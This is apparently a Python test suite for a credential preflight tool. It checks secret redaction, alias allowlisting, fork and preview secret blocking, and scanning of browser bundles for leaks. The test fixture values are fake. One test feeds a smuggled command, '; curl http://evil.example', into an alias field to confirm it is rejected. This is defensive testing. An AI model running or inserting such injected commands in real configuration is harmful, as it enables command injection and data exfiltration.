#!/usr/bin/env python3
"""APP-004 secure credential preflight and binding tests (fixture values only)."""

from __future__ import annotations

import base64
import hashlib
import importlib.util
import io
import json
import sys
import tempfile
import unittest
from contextlib import redirect_stderr, redirect_stdout
from pathlib import Path
from typing import Any, Dict, Mapping, Optional

REPO_ROOT = Path(__file__).resolve().parents[1]
FIXTURES = REPO_ROOT / "tests" / "fixtures" / "secrets_preflight"


def _b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).decode("ascii").rstrip("=")


def _runtime_jwt(*, role: str, seed: str) -> str:
    """JWT-shaped fixture generated at runtime (no static key literals)."""
    header = _b64url(json.dumps({"alg": "HS256", "typ": "JWT"}, separators=(",", ":")).encode())
    payload = _b64url(
        json.dumps(
            {"role": role, "iss": "supabase-fixture", "ref": seed},
            separators=(",", ":"),
        ).encode()
    )
    sig = _b64url(hashlib.sha256(f"{seed}:{role}".encode()).digest())
    return f"{header}.{payload}.{sig}"


# Fixture-only values — never real credentials.
FIX_SAVEDTUBE_VERCEL_PROJECT_ID = "prj_savedtube_fixture_001"
FIX_ARENA_VERCEL_PROJECT_ID = "prj_agent_arena_fixture_002"
FIX_SUPABASE_PROJECT_ID = "abcdefghijklmnop"
FIX_VERCEL_TOKEN = "vct_fixture_token_not_real_aaaaaaaa"
FIX_OPENAI_KEY = "sk-fixture-openai-key-not-real-bbbbbbbb"
FIX_SERVICE_ROLE = _runtime_jwt(role="service_role", seed="preflight-service")
FIX_ANON = _runtime_jwt(role="anon", seed=FIX_SUPABASE_PROJECT_ID)
FIX_SUPABASE_URL = f"https://{FIX_SUPABASE_PROJECT_ID}.supabase.co"
FIX_URL_EMBEDDED = "https://user:supersecretpass@fixture.example.com/db"
FIX_SECRET_BODY = f"leak:{FIX_VERCEL_TOKEN}:end"


def _load_module():
    import sys

    path = REPO_ROOT / "scripts" / "secrets-preflight.py"
    spec = importlib.util.spec_from_file_location("secrets_preflight", path)
    if spec is None or spec.loader is None:
        raise RuntimeError(f"unable to load secrets-preflight from {path}")
    module = importlib.util.module_from_spec(spec)
    sys.modules[spec.name] = module
    spec.loader.exec_module(module)
    return module


def _base_aliases() -> Dict[str, str]:
    return {
        "CLOUDFLARE_API_TOKEN": "CLOUDFLARE_API_TOKEN",
        "VERCEL_API_TOKEN": "VERCEL_API_TOKEN",
        "SUPABASE_URL": "SUPABASE_URL",
        "SUPABASE_ANON_KEY": "SUPABASE_ANON_KEY",
        "SUPABASE_SERVICE_ROLE_KEY": "SUPABASE_SERVICE_ROLE_KEY",
        "SUPABASE_ACCESS_TOKEN": "SUPABASE_ACCESS_TOKEN",
        "TERRAFORM_STATE_PASSWORD": "TERRAFORM_STATE_PASSWORD",
        "SUPABASE_PROJECT_ID": "SUPABASE_PROJECT_ID",
        "VERCEL_PROJECT_ID": "VERCEL_PROJECT_ID",
        "SAVEDTUBE_VERCEL_PROJECT_ID": "SAVEDTUBE_VERCEL_PROJECT_ID",
        "OPENAI_API_KEY": "OPENAI_API_KEY",
    }


def _fixture_values() -> Dict[str, str]:
    return {
        "CLOUDFLARE_API_TOKEN": "cf_fixture_token_not_real",
        "VERCEL_API_TOKEN": FIX_VERCEL_TOKEN,
        "SUPABASE_URL": FIX_SUPABASE_URL,
        "SUPABASE_ANON_KEY": FIX_ANON,
        "SUPABASE_SERVICE_ROLE_KEY": FIX_SERVICE_ROLE,
        "SUPABASE_ACCESS_TOKEN": "sbp_fixture_access_token_not_real",
        "TERRAFORM_STATE_PASSWORD": "fixture_state_password_32chars_xx",
        "SUPABASE_PROJECT_ID": FIX_SUPABASE_PROJECT_ID,
        "VERCEL_PROJECT_ID": FIX_ARENA_VERCEL_PROJECT_ID,
        "SAVEDTUBE_VERCEL_PROJECT_ID": FIX_SAVEDTUBE_VERCEL_PROJECT_ID,
        "OPENAI_API_KEY": FIX_OPENAI_KEY,
        "NEXT_PUBLIC_SUPABASE_URL": FIX_SUPABASE_URL,
        "NEXT_PUBLIC_SUPABASE_ANON_KEY": FIX_ANON,
        "NEXT_PUBLIC_SITE_URL": "https://arena.example.com",
    }


def _assert_no_secret_leak(text: str) -> None:
    for fragment in (
        FIX_VERCEL_TOKEN,
        FIX_OPENAI_KEY,
        FIX_SERVICE_ROLE,
        FIX_ANON,
        "supersecretpass",
        FIX_SECRET_BODY,
    ):
        if fragment and fragment in text:
            raise AssertionError("secret-like fixture value leaked into output")


class SecretsPreflightTests(unittest.TestCase):
    @classmethod
    def setUpClass(cls) -> None:
        cls.mod = _load_module()

    def _run(
        self,
        *,
        alias_map: Optional[Mapping[str, str]] = None,
        values: Optional[Mapping[str, str]] = None,
        context: Optional[Dict[str, Any]] = None,
        probe: bool = False,
        probe_transport: Any = None,
        browser_paths: Optional[list] = None,
        browser_evidence: str = "static-fixture",
    ):
        source = self.mod.CallerProvidedEnvSource(values or _fixture_values())
        return self.mod.run_preflight(
            alias_map=dict(alias_map or _base_aliases()),
            source=source,
            context=context or {},
            enable_network_probe=probe,
            probe_transport=probe_transport,
            browser_artifact_paths=browser_paths or [],
            browser_evidence_kind=browser_evidence,
        )

    def test_module_exports_expected_surface(self):
        for name in (
            "CallerProvidedEnvSource",
            "run_preflight",
            "redact_text",
            "build_binding_plan",
            "PUBLIC_CONFIG_ALLOWLIST",
            "ALLOWLISTED_ALIASES",
        ):
            self.assertTrue(hasattr(self.mod, name), f"missing {name}")

    def test_unknown_alias_fails_closed(self):
        aliases = _base_aliases()
        aliases["NOT_A_REAL_SECRET_SLOT"] = "NOT_A_REAL_SECRET_SLOT"
        report = self._run(alias_map=aliases)
        self.assertFalse(report.ok)
        blob = json.dumps(report.to_public_dict())
        self.assertIn("unknown", blob.lower())
        _assert_no_secret_leak(blob)

    def test_malicious_alias_rejected(self):
        aliases = _base_aliases()
        aliases["VERCEL_API_TOKEN"] = "VERCEL_API_TOKEN; curl http://evil.example"
        report = self._run(alias_map=aliases)
        self.assertFalse(report.ok)
        blob = json.dumps(report.to_public_dict())
        self.assertNotIn("evil.example", blob)
        _assert_no_secret_leak(blob)

    def test_missing_required_value_blocks(self):
        values = _fixture_values()
        del values["VERCEL_API_TOKEN"]
        report = self._run(values=values)
        self.assertFalse(report.ok)
        public = report.to_public_dict()
        vercel = next(a for a in public["aliases"] if a["alias"] == "VERCEL_API_TOKEN")
        self.assertFalse(vercel["present"])
        self.assertEqual(vercel["resolution"], "blocked")
        _assert_no_secret_leak(json.dumps(public))

    def test_invalid_empty_value_blocks(self):
        values = _fixture_values()
        values["SUPABASE_ANON_KEY"] = "   "
        report = self._run(values=values)
        self.assertFalse(report.ok)
        public = report.to_public_dict()
        anon = next(a for a in public["aliases"] if a["alias"] == "SUPABASE_ANON_KEY")
        self.assertFalse(anon["present"])
        _assert_no_secret_leak(json.dumps(public))

    def test_url_embedded_credentials_redacted_in_errors(self):
        values = _fixture_values()
        values["SUPABASE_URL"] = FIX_URL_EMBEDDED
        report = self._run(values=values)
        self.assertFalse(report.ok)
        blob = json.dumps(report.to_public_dict()) + "\n".join(report.errors)
        self.assertNotIn("supersecretpass", blob)
        self.assertNotIn("user:", blob)
        _assert_no_secret_leak(blob)

    def test_secret_like_exception_and_http_body_redacted(self):
        class BoomTransport:
            def request(self, **_kwargs):
                raise RuntimeError(FIX_SECRET_BODY)

        report = self._run(probe=True, probe_transport=BoomTransport())
        blob = json.dumps(report.to_public_dict()) + "\n".join(report.errors)
        self.assertNotIn(FIX_VERCEL_TOKEN, blob)
        self.assertNotIn(FIX_SECRET_BODY, blob)
        self.assertNotIn("RuntimeError", blob)
        self.assertIn("probe.transport_error", blob)

    def test_redact_text_masks_url_userinfo_and_bearer(self):
        samples = [
            FIX_URL_EMBEDDED,
            f"Authorization: Bearer {FIX_VERCEL_TOKEN}",
            FIX_SECRET_BODY,
            f"token={FIX_OPENAI_KEY}",
        ]
        for sample in samples:
            out = self.mod.redact_text(sample)
            _assert_no_secret_leak(out)
            self.assertNotEqual(out, sample)

    def test_savedtube_project_id_collision_blocked(self):
        values = _fixture_values()
        values["VERCEL_PROJECT_ID"] = FIX_SAVEDTUBE_VERCEL_PROJECT_ID
        report = self._run(values=values)
        self.assertFalse(report.ok)
        identity = report.to_public_dict()["identity"]
        self.assertEqual(identity["vercelProjectDistinct"], "blocked")
        self.assertIn("collision", identity["reason"].lower())
        _assert_no_secret_leak(json.dumps(report.to_public_dict()))

    def test_missing_arena_vercel_project_id_blocked_not_success(self):
        values = _fixture_values()
        del values["VERCEL_PROJECT_ID"]
        report = self._run(values=values)
        self.assertFalse(report.ok)
        identity = report.to_public_dict()["identity"]
        self.assertEqual(identity["vercelProjectDistinct"], "blocked")
        self.assertTrue(
            "unbound" in identity["reason"].lower()
            or "arena_unbound" in identity["reason"].lower()
        )
        # Must not report success for distinctness when Arena ID is missing
        self.assertNotEqual(identity["vercelProjectDistinct"], "verified")

    def test_distinct_vercel_ids_presence_ok_capability_unverified_without_probe(self):
        report = self._run(probe=False)
        public = report.to_public_dict()
        self.assertEqual(public["identity"]["vercelProjectDistinct"], "present-distinct")
        caps = {c["name"]: c["status"] for c in public["capabilities"]}
        self.assertEqual(caps.get("vercel.token.read"), "unverified")
        self.assertEqual(caps.get("vercel.token.write"), "unverified")
        # Production capabilities remain unverified without supervisor live preflight
        self.assertEqual(caps.get("production.credentials"), "unverified")

    def test_get_probe_does_not_claim_write(self):
        class GetOnlyTransport:
            def request(self, method, host, path, **_kwargs):
                if method != "GET":
                    raise AssertionError("write methods must not be implied by GET fixture")
                return {"status": 200, "json": {"id": "fixture-user", "teams": []}}

        report = self._run(probe=True, probe_transport=GetOnlyTransport())
        caps = {c["name"]: c["status"] for c in report.to_public_dict()["capabilities"]}
        self.assertEqual(caps["vercel.token.read"], "verified")
        self.assertNotEqual(caps["vercel.token.write"], "verified")
        self.assertIn(caps["vercel.token.write"], ("unverified", "blocked"))

    def test_openai_key_does_not_prove_codex_or_decisions(self):
        report = self._run()
        caps = {c["name"]: c["status"] for c in report.to_public_dict()["capabilities"]}
        self.assertIn(caps["openai.api"], ("present", "unverified", "verified"))
        self.assertIn(caps["openai.codex"], ("unverified", "blocked"))
        self.assertIn(caps["openai.decisions"], ("unverified", "blocked"))
        self.assertNotEqual(caps["openai.codex"], "verified")
        self.assertNotEqual(caps["openai.decisions"], "verified")

    def test_unknown_permission_claim_fails_closed(self):
        report = self._run(
            context={"claimedPermissions": ["vercel.admin.destroy_all_projects"]}
        )
        self.assertFalse(report.ok)
        blob = json.dumps(report.to_public_dict())
        self.assertIn("unknown", blob.lower())
        _assert_no_secret_leak(blob)

    def test_cross_account_mismatch_blocked(self):
        report = self._run(
            context={
                "expectedAccountFingerprints": {
                    "vercel": "acct_savedtube_fixture",
                    "supabase": "proj_savedtube_fixture",
                },
                "observedAccountFingerprints": {
                    "vercel": "acct_other_fixture",
                    "supabase": "proj_savedtube_fixture",
                },
            }
        )
        self.assertFalse(report.ok)
        caps = {c["name"]: c["status"] for c in report.to_public_dict()["capabilities"]}
        self.assertEqual(caps["account.alignment"], "blocked")

    def test_public_config_strict_allowlist(self):
        values = _fixture_values()
        values["NEXT_PUBLIC_SECRET_LEAK"] = FIX_SERVICE_ROLE
        report = self._run(values=values)
        self.assertFalse(report.ok)
        public = report.to_public_dict()
        self.assertTrue(
            any("NEXT_PUBLIC" in e or "public" in e.lower() for e in report.errors)
            or any(
                c["name"] == "public.config.allowlist" and c["status"] == "blocked"
                for c in public["capabilities"]
            )
        )
        _assert_no_secret_leak(json.dumps(public))

    def test_preview_credentials_default_disabled(self):
        report = self._run(context={"deploymentTarget": "preview"})
        public = report.to_public_dict()
        caps = {c["name"]: c["status"] for c in public["capabilities"]}
        self.assertEqual(caps["preview.production_secrets"], "blocked")
        preview = public.get("preview") or {}
        self.assertFalse(preview.get("injectProductionSecrets", True))

    def test_fork_context_blocks_production_secret_injection(self):
        report = self._run(context={"isForkPullRequest": True})
        public = report.to_public_dict()
        caps = {c["name"]: c["status"] for c in public["capabilities"]}
        self.assertEqual(caps["fork.production_secrets"], "blocked")
        self.assertFalse(public["fork"]["injectProductionSecrets"])

    def test_binding_plan_aliases_only_no_values(self):
        plan = self.mod.build_binding_plan(_base_aliases())
        blob = json.dumps(plan)
        for value in _fixture_values().values():
            self.assertNotIn(value, blob)
        self.assertIn("VERCEL_API_TOKEN", blob)
        self.assertIn("VERCEL_PROJECT_ID", blob)
        self.assertTrue(plan["bindings"])
        for binding in plan["bindings"]:
            self.assertIn("alias", binding)
            self.assertIn("target", binding)
            self.assertNotIn("value", binding)
            self.assertNotIn("secret", binding)

    def test_report_never_dumps_environment(self):
        report = self._run()
        public = report.to_public_dict()
        blob = json.dumps(public)
        self.assertNotIn("environ", blob.lower())
        self.assertNotIn(FIX_VERCEL_TOKEN, blob)
        self.assertNotIn("os.environ", blob)

    def test_server_only_keys_flagged(self):
        report = self._run()
        public = report.to_public_dict()
        server = {
            a["alias"]: a for a in public["aliases"] if a["alias"] == "SUPABASE_SERVICE_ROLE_KEY"
        }
        self.assertTrue(server["SUPABASE_SERVICE_ROLE_KEY"]["serverOnly"])
        self.assertFalse(server["SUPABASE_SERVICE_ROLE_KEY"].get("browserAllowed", True))

    def test_browser_scan_labels_static_fixture_evidence(self):
        FIXTURES.mkdir(parents=True, exist_ok=True)
        artifact = FIXTURES / "browser_static_sample.js"
        artifact.write_text(
            "// fixture static sample\nconst x = 'public-ok';\n",
            encoding="utf-8",
        )
        report = self._run(
            browser_paths=[str(artifact)],
            browser_evidence="static-fixture",
            values={
                **_fixture_values(),
                # Provide a canary that must NOT appear in the static fixture.
            },
        )
        scan = report.to_public_dict()["browserScan"]
        self.assertEqual(scan["evidenceKind"], "static-fixture")
        self.assertNotEqual(scan["evidenceKind"], "built-bundle")
        self.assertFalse(scan.get("claimsFullProductionBuild", True))
        _assert_no_secret_leak(json.dumps(scan))

    def test_browser_scan_detects_fixture_leak_without_echoing_secret(self):
        FIXTURES.mkdir(parents=True, exist_ok=True)
        artifact = FIXTURES / "browser_leak_sample.js"
        artifact.write_text(
            f"window.__LEAK__ = '{FIX_SERVICE_ROLE}';\n",
            encoding="utf-8",
        )
        report = self._run(
            browser_paths=[str(artifact)],
            browser_evidence="static-fixture",
        )
        self.assertFalse(report.ok)
        scan = report.to_public_dict()["browserScan"]
        self.assertEqual(scan["status"], "blocked")
        blob = json.dumps(scan) + "\n".join(report.errors)
        self.assertNotIn(FIX_SERVICE_ROLE, blob)
        self.assertTrue(
            any("SUPABASE_SERVICE_ROLE_KEY" in str(x) for x in scan.get("findings", []))
            or "server-only" in blob.lower()
            or "excluded" in blob.lower()
        )

    def test_browser_scan_does_not_claim_built_bundle_when_static(self):
        report = self._run(browser_paths=[], browser_evidence="static-fixture")
        scan = report.to_public_dict()["browserScan"]
        self.assertEqual(scan["evidenceKind"], "static-fixture")
        self.assertFalse(scan.get("claimsFullProductionBuild", True))

    def test_network_probe_rejects_non_allowlisted_host(self):
        class EvilTransport:
            def request(self, method, host, path, **_kwargs):
                return {"status": 200, "json": {}}

        # Internal call path: attempting probe to evil host must fail closed
        with self.assertRaises(Exception) as ctx:
            self.mod.probe_allowlisted(
                transport=EvilTransport(),
                host="evil.example",
                path="/",
                method="GET",
            )
        msg = self.mod.redact_text(str(ctx.exception))
        self.assertNotIn("evil.example.com/secret", msg)

    def test_network_probe_rejects_redirects_and_validates_schema(self):
        class RedirectTransport:
            def request(self, **_kwargs):
                return {"status": 302, "json": None, "headers": {"location": "https://api.vercel.com/x"}}

        report = self._run(probe=True, probe_transport=RedirectTransport())
        caps = {c["name"]: c["status"] for c in report.to_public_dict()["capabilities"]}
        self.assertEqual(caps["vercel.token.read"], "blocked")
        blob = json.dumps(report.to_public_dict())
        self.assertNotIn("api.vercel.com/x", blob)

    def test_cli_json_stdout_has_no_secret_substrings(self):
        aliases_path = None
        try:
            FIXTURES.mkdir(parents=True, exist_ok=True)
            with tempfile.NamedTemporaryFile(
                "w", suffix=".json", delete=False, dir=str(FIXTURES)
            ) as af:
                json.dump(_base_aliases(), af)
                aliases_path = Path(af.name)
            stdout = io.StringIO()
            stderr = io.StringIO()
            old_stdin = sys.stdin
            try:
                sys.stdin = io.StringIO(json.dumps(_fixture_values()))
                with redirect_stdout(stdout), redirect_stderr(stderr):
                    code = self.mod.main(
                        [
                            "--aliases-json",
                            str(aliases_path),
                            "--values-stdin",
                            "--format",
                            "json",
                            "--app-id",
                            "example-app",
                        ]
                    )
            finally:
                sys.stdin = old_stdin
            out = stdout.getvalue() + stderr.getvalue()
            _assert_no_secret_leak(out)
            self.assertIn(code, (0, 1))
            parsed = json.loads(stdout.getvalue())
            self.assertIn("aliases", parsed)
            self.assertIn("capabilities", parsed)
            self.assertFalse(parsed.get("productionReady", True))
        finally:
            if aliases_path:
                aliases_path.unlink(missing_ok=True)

    def test_disallow_arbitrary_env_file_probing_api(self):
        self.assertFalse(hasattr(self.mod, "load_dotenv"))
        self.assertFalse(hasattr(self.mod, "read_env_file"))
        self.assertFalse(hasattr(self.mod, "probe_filesystem_secrets"))

    def test_source_rejects_non_allowlisted_resolve(self):
        source = self.mod.CallerProvidedEnvSource(_fixture_values())
        with self.assertRaises(Exception):
            source.resolve("ARBITRARY_SHELL_SECRET")

    def test_example_binding_plan_file_aliases_only(self):
        path = REPO_ROOT / "examples" / "credential-binding.example.json"
        self.assertTrue(path.is_file())
        plan = json.loads(path.read_text(encoding="utf-8"))
        blob = json.dumps(plan)
        self.assertIn("example-owner", blob or "example")
        for bad in ("sk-", "eyJ", "vct_", "password=", "Bearer "):
            self.assertNotIn(bad, blob)
        self.assertNotIn("agrana", blob.lower())

    def test_workflow_fork_pr_secret_safeguard_present(self):
        wf = (REPO_ROOT / ".github" / "workflows" / "terraform.yml").read_text(
            encoding="utf-8"
        )
        self.assertIn("APP-004", wf)
        self.assertTrue(
            "head.repo.full_name" in wf or "fork" in wf.lower(),
            "terraform workflow must gate secret-bearing jobs away from fork PRs",
        )


class SecretsPreflightStaticDocsTests(unittest.TestCase):
    def test_env_example_separates_public_and_secrets(self):
        text = (REPO_ROOT / "env.example").read_text(encoding="utf-8")
        self.assertIn("NEXT_PUBLIC_", text)
        self.assertIn("APP-004", text)
        self.assertIn("server-only", text.lower())
        self.assertIn("VERCEL_PROJECT_ID", text)
        self.assertIn("SAVEDTUBE_VERCEL_PROJECT_ID", text)
        # No real-looking secrets
        self.assertNotRegex(text, r"sk-[a-zA-Z0-9]{10,}")
        self.assertNotIn("alfonsograna", text.lower())

    def test_bootstrap_docs_cover_app004(self):
        docs = (REPO_ROOT / "docs" / "bootstrap.md").read_text(encoding="utf-8")
        self.assertIn("APP-004", docs)
        self.assertIn("secrets-preflight", docs)
        self.assertIn("unverified", docs.lower())
        self.assertIn("example-owner", docs)
        self.assertIn("fork", docs.lower())
        self.assertIn("stdin", docs.lower())
        self.assertIn("fixtures-only", docs.lower())
        self.assertIn("remapping", docs.lower())
        self.assertIn("productionReady", docs)
        self.assertIn("optional", docs.lower())


class SecretsPreflightCorrectionRegressions(unittest.TestCase):
    """Failing-first regressions for APP-004 correctness/security corrections."""

    # Deterministic test-only synthetic: SHA256 of a fixed seed, prefixed fixture-.
    # Built at import time so source contains no high-entropy secret literal.
    OPAQUE_TOKEN = "fixture-" + hashlib.sha256(
        b"secrets-preflight-correction-opaque-redaction-seed"
    ).hexdigest()

    @classmethod
    def setUpClass(cls) -> None:
        cls.mod = _load_module()

    def _run(self, **kwargs):
        source = self.mod.CallerProvidedEnvSource(
            kwargs.pop("values", None) or _fixture_values()
        )
        return self.mod.run_preflight(
            alias_map=dict(kwargs.pop("alias_map", None) or _base_aliases()),
            source=source,
            context=kwargs.pop("context", None) or {},
            enable_network_probe=kwargs.pop("probe", False),
            probe_transport=kwargs.pop("probe_transport", None),
            browser_artifact_paths=kwargs.pop("browser_paths", None) or [],
            browser_evidence_kind=kwargs.pop("browser_evidence", "static-fixture"),
            app_id=kwargs.pop("app_id", "example-app"),
        )

    def test_source_rejects_none_bool_dict_coercion(self):
        # None/empty => missing (must not coerce to the string "None")
        source_none = self.mod.CallerProvidedEnvSource(
            {**_fixture_values(), "VERCEL_API_TOKEN": None}  # type: ignore[dict-item]
        )
        self.assertIsNone(source_none.resolve("VERCEL_API_TOKEN"))
        with self.assertRaises(Exception):
            self.mod.CallerProvidedEnvSource(
                {**_fixture_values(), "VERCEL_API_TOKEN": True}  # type: ignore[dict-item]
            )
        with self.assertRaises(Exception):
            self.mod.CallerProvidedEnvSource(
                {**_fixture_values(), "VERCEL_API_TOKEN": {"nested": "x"}}  # type: ignore[dict-item]
            )
        with self.assertRaises(Exception):
            self.mod.CallerProvidedEnvSource({None: "x"})  # type: ignore[dict-item]
        source = self.mod.CallerProvidedEnvSource(
            {**{k: v for k, v in _fixture_values().items() if k != "VERCEL_API_TOKEN"}}
        )
        self.assertIsNone(source.resolve("VERCEL_API_TOKEN"))

    def test_malformed_alias_map_and_context_fail_closed_no_traceback_leak(self):
        # Mixed/non-string keys must not crash on sorted() and must not disclose values.
        bad_map = {
            "VERCEL_API_TOKEN": "VERCEL_API_TOKEN",
            42: "CLOUDFLARE_API_TOKEN",
            "SUPABASE_URL": "SUPABASE_URL",
        }
        for rest in _base_aliases().items():
            bad_map.setdefault(rest[0], rest[1])
        report = self._run(
            alias_map=bad_map,  # type: ignore[arg-type]
            context={
                "claimedPermissions": "not-a-list",
                "expectedAccountFingerprints": ["list-not-object"],
                "observedAccountFingerprints": {"vercel": {"nested": True}},
            },
        )
        self.assertFalse(report.ok)
        blob = json.dumps(report.to_public_dict())
        self.assertNotIn("Traceback", blob)
        self.assertNotIn("TypeError", blob)
        _assert_no_secret_leak(blob)

    def test_alias_remapping_prohibited_not_silently_ignored(self):
        aliases = _base_aliases()
        aliases["VERCEL_API_TOKEN"] = "CLOUDFLARE_API_TOKEN"
        values = _fixture_values()
        # Value lives only under the remapped name; slot must not resolve via ignore.
        values["CLOUDFLARE_API_TOKEN"] = values["VERCEL_API_TOKEN"]
        del values["VERCEL_API_TOKEN"]
        report = self._run(alias_map=aliases, values=values)
        self.assertFalse(report.ok)
        blob = json.dumps(report.to_public_dict()).lower()
        self.assertTrue(
            "remap" in blob or "remapping" in blob or "must equal" in blob,
            "remapping must be explicitly rejected",
        )

    def test_public_config_value_must_not_equal_server_only_secret(self):
        values = _fixture_values()
        values["NEXT_PUBLIC_SUPABASE_ANON_KEY"] = values["SUPABASE_SERVICE_ROLE_KEY"]
        report = self._run(values=values)
        self.assertFalse(report.ok)
        public = report.to_public_dict()
        self.assertTrue(
            any(
                c["name"] == "public.config.secret_exfiltration"
                and c["status"] == "blocked"
                for c in public["capabilities"]
            )
            or any("server-only" in e.lower() or "exfil" in e.lower() for e in report.errors)
        )
        _assert_no_secret_leak(json.dumps(public))

    def test_probe_exception_emits_fixed_code_not_opaque_token_or_classname(self):
        opaque = self.OPAQUE_TOKEN

        class BoomTransport:
            def request(self, **_kwargs):
                raise ConnectionError(
                    f"TLS handshake failed for identity={opaque} body=secret-payload"
                )

        report = self._run(probe=True, probe_transport=BoomTransport())
        blob = json.dumps(report.to_public_dict()) + "\n".join(report.errors)
        self.assertNotIn(opaque, blob)
        self.assertNotIn("secret-payload", blob)
        self.assertNotIn("ConnectionError", blob)
        self.assertNotIn("TLS handshake", blob)
        self.assertTrue(
            any("probe.transport_error" in e for e in report.errors)
            or "probe.transport_error" in blob
        )

    def test_browser_scan_no_paths_is_unverified_not_ok(self):
        report = self._run(browser_paths=[], browser_evidence="static-fixture")
        scan = report.to_public_dict()["browserScan"]
        self.assertIn(scan["status"], ("unverified", "skipped"))
        self.assertNotEqual(scan["status"], "ok")
        self.assertFalse(scan.get("claimsFullProductionBuild", True))

    def test_browser_scan_missing_empty_unreadable_never_ok(self):
        FIXTURES.mkdir(parents=True, exist_ok=True)
        empty = FIXTURES / "browser_empty.js"
        empty.write_bytes(b"")
        missing = FIXTURES / "browser_missing_does_not_exist.js"
        if missing.exists():
            missing.unlink()
        unreadable_dir = FIXTURES / "browser_not_a_file"
        unreadable_dir.mkdir(exist_ok=True)
        for path in (str(missing), str(empty), str(unreadable_dir)):
            report = self._run(browser_paths=[path], browser_evidence="static-fixture")
            scan = report.to_public_dict()["browserScan"]
            self.assertNotEqual(scan["status"], "ok", path)
            self.assertFalse(report.ok)
            blob = json.dumps(report.to_public_dict())
            self.assertNotIn(FIX_SERVICE_ROLE, blob)
            self.assertNotIn(str(FIXTURES), blob)  # no path disclosure with creds context

    def test_browser_scan_finds_secret_beyond_2m_and_across_chunk_boundary(self):
        FIXTURES.mkdir(parents=True, exist_ok=True)
        huge = FIXTURES / "browser_huge_leak.js"
        # Secret past the old 2MiB prefix cut, and another spanning a 64KiB boundary.
        prefix = b"x" * (2_000_000 + 100)
        mid_pad = b"y" * (65536 - 10)
        secret_a = FIX_SERVICE_ROLE.encode("utf-8")
        secret_b = FIX_VERCEL_TOKEN.encode("utf-8")
        # Place secret_b so it straddles a 64KiB boundary after a modest header.
        header = b"z" * (65536 - (len(secret_b) // 2))
        payload = header + secret_b + b"\n" + prefix + secret_a + b"\n"
        huge.write_bytes(payload)
        try:
            report = self._run(
                browser_paths=[str(huge)],
                browser_evidence="static-fixture",
            )
            self.assertFalse(report.ok)
            scan = report.to_public_dict()["browserScan"]
            self.assertEqual(scan["status"], "blocked")
            aliases_found = {f.get("alias") for f in scan.get("findings", [])}
            self.assertTrue(
                "SUPABASE_SERVICE_ROLE_KEY" in aliases_found
                or "VERCEL_API_TOKEN" in aliases_found
            )
            blob = json.dumps(scan) + "\n".join(report.errors)
            self.assertNotIn(FIX_SERVICE_ROLE, blob)
            self.assertNotIn(FIX_VERCEL_TOKEN, blob)
        finally:
            huge.unlink(missing_ok=True)

    def test_browser_built_bundle_flag_does_not_claim_full_production_build(self):
        FIXTURES.mkdir(parents=True, exist_ok=True)
        artifact = FIXTURES / "browser_static_sample.js"
        artifact.write_text("const ok = true;\n", encoding="utf-8")
        report = self._run(
            browser_paths=[str(artifact)],
            browser_evidence="built-bundle",
        )
        scan = report.to_public_dict()["browserScan"]
        self.assertFalse(scan.get("claimsFullProductionBuild", True))
        self.assertIn("supplied", (scan.get("scanScope") or "").lower())
        note = (scan.get("note") or "").lower()
        self.assertTrue("supplied" in note or "artifact" in note)

    def test_cli_rejects_non_fixture_values_json_on_disk(self):
        import subprocess

        with tempfile.NamedTemporaryFile("w", suffix=".json", delete=False) as vf:
            json.dump(_fixture_values(), vf)
            values_path = Path(vf.name)
        aliases_path = FIXTURES / "cli_aliases.json"
        FIXTURES.mkdir(parents=True, exist_ok=True)
        aliases_path.write_text(json.dumps(_base_aliases()), encoding="utf-8")
        try:
            proc = subprocess.run(
                [
                    sys.executable,
                    str(REPO_ROOT / "scripts" / "secrets-preflight.py"),
                    "--aliases-json",
                    str(aliases_path),
                    "--values-json",
                    str(values_path),
                    "--format",
                    "json",
                ],
                capture_output=True,
                text=True,
                check=False,
            )
            out = proc.stdout + proc.stderr
            _assert_no_secret_leak(out)
            self.assertNotEqual(proc.returncode, 0)
            self.assertTrue(
                "values.source_not_allowed" in out
                or "fixtures" in out.lower()
                or "values-stdin" in out.lower()
            )
        finally:
            values_path.unlink(missing_ok=True)

    def test_cli_stdin_and_env_transport_subprocess_redacted(self):
        import os
        import subprocess

        aliases_path = FIXTURES / "cli_aliases.json"
        FIXTURES.mkdir(parents=True, exist_ok=True)
        aliases_path.write_text(json.dumps(_base_aliases()), encoding="utf-8")
        values = _fixture_values()
        proc = subprocess.run(
            [
                sys.executable,
                str(REPO_ROOT / "scripts" / "secrets-preflight.py"),
                "--aliases-json",
                str(aliases_path),
                "--values-stdin",
                "--format",
                "json",
                "--app-id",
                "example-app",
            ],
            input=json.dumps(values),
            capture_output=True,
            text=True,
            check=False,
        )
        out = proc.stdout + proc.stderr
        _assert_no_secret_leak(out)
        parsed = json.loads(proc.stdout)
        self.assertIn("aliases", parsed)
        self.assertFalse(parsed.get("productionReady", True))
        self.assertFalse(parsed.get("deploymentAuthorized", True))

        env = os.environ.copy()
        for key, val in values.items():
            env[key] = val
        # Ensure no accidental dump of unrelated env keys into report.
        env["ARBITRARY_SHELL_SECRET"] = "should-never-appear-in-report"
        proc2 = subprocess.run(
            [
                sys.executable,
                str(REPO_ROOT / "scripts" / "secrets-preflight.py"),
                "--aliases-json",
                str(aliases_path),
                "--values-env",
                "--format",
                "json",
                "--app-id",
                "example-app",
            ],
            capture_output=True,
            text=True,
            env=env,
            check=False,
        )
        out2 = proc2.stdout + proc2.stderr
        _assert_no_secret_leak(out2)
        self.assertNotIn("should-never-appear-in-report", out2)
        self.assertNotIn("ARBITRARY_SHELL_SECRET", out2)
        parsed2 = json.loads(proc2.stdout)
        self.assertIn("capabilities", parsed2)

    def test_cli_malformed_json_shapes_fail_cleanly(self):
        import subprocess

        aliases_path = FIXTURES / "cli_aliases.json"
        FIXTURES.mkdir(parents=True, exist_ok=True)
        aliases_path.write_text(json.dumps(_base_aliases()), encoding="utf-8")
        for payload in ("null", "[]", '"scalar"', "{"):
            proc = subprocess.run(
                [
                    sys.executable,
                    str(REPO_ROOT / "scripts" / "secrets-preflight.py"),
                    "--aliases-json",
                    str(aliases_path),
                    "--values-stdin",
                    "--format",
                    "json",
                ],
                input=payload,
                capture_output=True,
                text=True,
                check=False,
            )
            out = proc.stdout + proc.stderr
            self.assertNotEqual(proc.returncode, 0)
            self.assertNotIn("Traceback", out)
            _assert_no_secret_leak(out)

    def test_binding_plan_uses_generic_or_derived_app_target(self):
        plan = self.mod.build_binding_plan(_base_aliases(), app_id="example-app")
        blob = json.dumps(plan)
        self.assertNotIn("agent-arena-process", blob)
        self.assertNotIn("agent-arena-new-project", blob)
